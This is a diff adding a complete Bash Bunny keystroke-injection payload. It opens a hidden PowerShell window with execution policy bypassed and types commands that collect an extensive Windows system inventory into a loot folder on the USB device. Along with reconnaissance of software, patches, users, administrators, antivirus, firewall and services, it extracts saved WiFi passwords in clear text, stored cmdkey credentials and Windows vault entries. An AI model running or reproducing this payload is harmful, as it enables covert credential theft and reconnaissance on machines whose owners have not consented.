@@ -1,0 +1,171 @@
+#!/bin/bash
+
+LED SETUP
+
+# Switch to HID STORAGE so the target can see the Bash Bunny drive
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+# Give the target OS a moment to mount the Bash Bunny drive
+sleep 3 
+
+LED ATTACK
+
+RUN WIN powershell -w hidden -ep bypass
+
+# Find the Bash Bunny drive letter, create the loot/info folder, and set the file path
+Q STRING "\$bb = (Get-Volume -FileSystemLabel 'BashBunny').DriveLetter + ':'; New-Item -Path \"\$bb\loot\info\" -ItemType Directory -Force | Out-Null; \$hn = \$env:COMPUTERNAME; \$ts = (Get-Date -Format 'yyyy-MM-dd_HH-mm-ss'); \$file = \"\$bb\loot\info\SystemInventory-\${hn}-\${ts}.jsonl\";"
+Q ENTER
+Q DELAY 300
+
+# Define the function and clear the file if it already exists
+Q STRING "Remove-Item \$file -ErrorAction SilentlyContinue; function Add-Json(\$T,\$D){ [PSCustomObject]@{Category=\$T;Timestamp=(Get-Date -Format 'o');Payload=\$D} | ConvertTo-Json -Compress | Out-File \$file -Append -Encoding utf8 };"
+Q ENTER
+Q DELAY 200
+
+Q STRING "\$A = Get-NetIPConfiguration | Where-Object {\$_.IPv4DefaultGateway -ne \$null} | Select-Object -First 1; \$S = Get-CimInstance Win32_ComputerSystem; \$O = Get-CimInstance Win32_OperatingSystem; \$C = Get-CimInstance Win32_Processor;"
+Q ENTER
+Q DELAY 300
+
+Q STRING "Add-Json 'CoreInfo' @{Hostname=\$S.Name; Internal_IP=\$(if(\$A){(\$A.IPv4Address.IPAddress)-join','}else{'N/A'}); \\ "
+Q ENTER
+Q DELAY 200
+Q STRING "CPU=\$C.Name; RAM_GB=[math]::Round((\$S.TotalPhysicalMemory/1GB),2); Domain=\$S.Domain; OS=\$O.Caption; Uptime_Days=[math]::Round((New-TimeSpan -Start \$O.LastBootUpTime -End (Get-Date)).TotalDays,0)};"
+Q ENTER
+Q DELAY 500
+
+Q STRING "\$RP = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'; \\ "
+Q ENTER
+Q DELAY 200
+Q STRING "foreach(\$r in \$RP){ Get-ItemProperty \$r | Where-Object {\$_.DisplayName} | ForEach-Object { Add-Json 'Software' @{Name=\$_.DisplayName; Version=\$_.DisplayVersion; Publisher=\$_.Publisher} } };"
+Q ENTER
+Q DELAY 300
+
+Q STRING "\$bp = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice' -ErrorAction SilentlyContinue).ProgId; Add-Json 'DefaultBrowser' @{ProgID=\$bp}"
+Q ENTER
+Q DELAY 200
+
+Q STRING "Get-SmbMapping -ErrorAction SilentlyContinue | ForEach-Object { Add-Json 'MappedDrives' @{Local=\$_.LocalPath; Remote=\$_.RemotePath; Status=\$_.Status} }"
+Q ENTER
+Q DELAY 300
+
+Q STRING "Get-Printer -ErrorAction SilentlyContinue | ForEach-Object { Add-Json 'Printers' @{Name=\$_.Name; Driver=\$_.DriverName; Shared=\$_.Shared} }"
+Q ENTER
+Q DELAY 300
+
+Q STRING "\$off = Get-Item \"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE\" -ErrorAction SilentlyContinue; if(-not \$off){\$off = Get-Item \"C:\Program Files (x86)\Microsoft Office\root\Office16\WINWORD.EXE\" -ErrorAction SilentlyContinue}; Add-Json 'OfficeVersion' @{Version=\$(if(\$off){\$off.VersionInfo.FileVersion}else{'Not Installed'}); Bitness=\$(if(\$off){if(\$off.DirectoryName -like \"*x86*\"){'32-Bit'}else{'64-Bit'}}else{'N/A'})}"
+Q ENTER
+Q DELAY 300
+
+Q STRING "\$FY = (Get-Date).AddYears(-5); Get-HotFix | Where-Object {\$_.InstalledOn -and \$_.InstalledOn -ge \$FY} | \\ "
+Q ENTER
+Q DELAY 200
+Q STRING "ForEach-Object { Add-Json 'Hotfix' @{ID=\$_.HotFixID; Description=\$_.Description; InstalledOn=\$_.InstalledOn.ToString('yyyy-MM-dd')} };"
+Q ENTER
+Q DELAY 300
+
+Q STRING "Get-CimInstance Win32_StartupCommand | Where-Object {\$_.Name -or \$_.Command} | ForEach-Object { \\ "
+Q ENTER
+Q DELAY 200
+Q STRING "\$loc = \$_.Location -replace '^HKLM\\\\','Local Machine\\ ' -replace '^HKCU\\\\','Current User\\ ' -replace '^HKU\\\\','Users\\ '; \\ "
+Q ENTER
+Q DELAY 200
+Q STRING "Add-Json 'Startup' @{Name=\$_.Name; Command=\$_.Command; Location=\$loc} };"
+Q ENTER
+Q DELAY 500
+
+Q STRING "\$pr = netsh wlan show profiles | Select-String \"\:(.+)\$\" | %{\$_.Matches.Groups[1].Value.Trim()}; \\ "
+Q ENTER
+Q DELAY 500
+Q STRING "foreach(\$p in \$pr){ \$d = netsh wlan show profile name=\"\$p\" key=clear | Out-String; \$a=\"None\"; \$k=\"None\"; \\ "
+Q ENTER
+Q DELAY 300
+Q STRING "if(\$d -match \"Authentication\s*:\s*(.+)\"){\$a=\$Matches[1].Trim()}; if(\$d -match \"Key Content\s*:\s*(.+)\"){\$k=\$Matches[1].Trim()}; Add-Json 'WiFi' @{SSID=\$p;Auth=\$a;Key=\$k} }"
+Q ENTER
+Q DELAY 500
+
+Q STRING "\$cr = @(); \$ob = \$null; cmdkey /list | % { if(\$_ -match \"^\s+Target:\s+(.+)\"){ if(\$ob){\$cr+=\$ob}; \$ob = [PSCustomObject]@{Target=\$Matches[1].Trim();Type=\"\";User=\"\"} } \\ "
+Q ENTER
+Q DELAY 300
+Q STRING "elseif(\$_ -match \"^\s+Type:\s+(.+)\"){ \$ob.Type = \$Matches[1].Trim() } elseif(\$_ -match \"^\s+User:\s+(.+)\"){ \$ob.User = \$Matches[1].Trim() } }; if(\$ob){\$cr+=\$ob}; Add-Json 'CmdKey' \$cr"
+Q ENTER
+Q DELAY 200
+
+Q STRING "Add-Json 'WindowsVault' @(vaultcmd /listcreds:\"Windows Credentials\" /all);"
+Q ENTER
+Q DELAY 200
+
+Q STRING "Add-Json 'BIOS' @(Get-CimInstance Win32_BIOS | Select-Object SerialNumber, SMBIOSBIOSVersion, Manufacturer);"
+Q ENTER
+Q DELAY 300
+
+Q STRING "Add-Json 'Disks' @(Get-CimInstance Win32_LogicalDisk | Where-Object {\$_.DriveType -eq 3} | \\ "
+Q ENTER
+Q DELAY 200
+Q STRING "Select-Object DeviceID, @{N='Size_GB';E={[math]::Round(\$_.Size/1GB,2)}}, @{N='FreeSpace_GB';E={[math]::Round(\$_.FreeSpace/1GB,2)}})"
+Q ENTER
+Q DELAY 300
+
+Q STRING "Add-Json 'NetworkAdapters' @(Get-NetAdapter | Where-Object {\$_.Status -eq 'Up'} | Select-Object Name, InterfaceDescription, MacAddress, LinkSpeed); \\ "
+Q ENTER
+Q DELAY 200
+Q STRING "Add-Json 'ActiveConnections' @(Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess);"
+Q ENTER
+Q DELAY 300
+
+Q STRING "Add-Json 'LocalUsers' @(Get-LocalUser | Select-Object Name, Enabled, \\ "
+Q ENTER
+Q DELAY 200
+Q STRING "@{N='LastLogon';E={if(\$_.LastLogon){\$_.LastLogon.ToString('yyyy-MM-dd')}else{'Never'}}}, \\ "
+Q ENTER
+Q DELAY 200
+Q STRING "@{N='PasswordExpires';E={\$_.PasswordExpires.ToString('yyyy-MM-dd')}})"
+Q ENTER
+Q DELAY 300
+
+Q STRING "Get-LocalGroupMember -Group 'Administrators' -ErrorAction SilentlyContinue | ForEach-Object { \\ "
+Q ENTER
+Q DELAY 200
+Q STRING "\$src = switch(\$_.PrincipalSource){ 1{'Local'} 2{'ActiveDirectory'} 3{'AzureAD'} 4{'MicrosoftAccount'} default{'Unknown'} }; \\ "
+Q ENTER
+Q DELAY 200
+Q STRING "Add-Json 'LocalAdmins' @{Name=\$_.Name; Source=\$src; Class=\$_.ObjectClass} }"
+Q ENTER
+Q DELAY 300
+
+Q STRING "\$sc = Get-MpComputerStatus -ErrorAction SilentlyContinue; \\ "
+Q ENTER
+Q DELAY 200
+Q STRING "Add-Json 'SecurityCenter' @{Antivirus=\$(if(\$sc.AMServiceEnabled){'Enabled'}else{'Disabled'}); \\ "
+Q ENTER
+Q DELAY 200
+Q STRING "Antispyware=\$(if(\$sc.AntispywareEnabled){'Enabled'}else{'Disabled'}); \\ "
+Q ENTER
+Q DELAY 200
+Q STRING "RealTimeProtection=\$(if(\$sc.RealTimeProtectionEnabled){'Enabled'}else{'Disabled'})}"
+Q ENTER
+Q DELAY 300
+
+Q STRING "Add-Json 'Firewall' @(Get-NetFirewallProfile | Select-Object Name, \\ "
+Q ENTER
+Q DELAY 200
+Q STRING "@{N='Status';E={if(\$_.Enabled){'Enabled'}else{'Disabled'}}})"
+Q ENTER
+Q DELAY 300
+
+Q STRING "Get-Process | Where-Object {\$_.Path -and \$_.Path -notlike \"C:\Windows*\" -and \$_.Path -notlike \"C:\Program Files\WindowsApps*\"} | ForEach-Object { Add-Json 'UserProcesses' @{Name=\$_.Name; Path=\$_.Path} }"
+Q ENTER
+Q DELAY 300
+
+Q STRING "Get-ScheduledTask | Where-Object {(\$_.State -eq 'Ready' -or \$_.State -eq 'Running') -and \$_.TaskPath -notlike \"\Microsoft*\"} | ForEach-Object { Add-Json 'CustomTasks' @{Name=\$_.TaskName; Path=\$_.TaskPath} }"
+Q ENTER
+Q DELAY 300
+
+Q STRING "Add-Json 'Services' @(Get-CimInstance Win32_Service | Where-Object {\$_.State -eq 'Running'} | Select-Object Name, DisplayName, PathName)"
+Q ENTER
+Q DELAY 200
+
+Q STRING "exit"
+Q ENTER
+
+LED FINISH
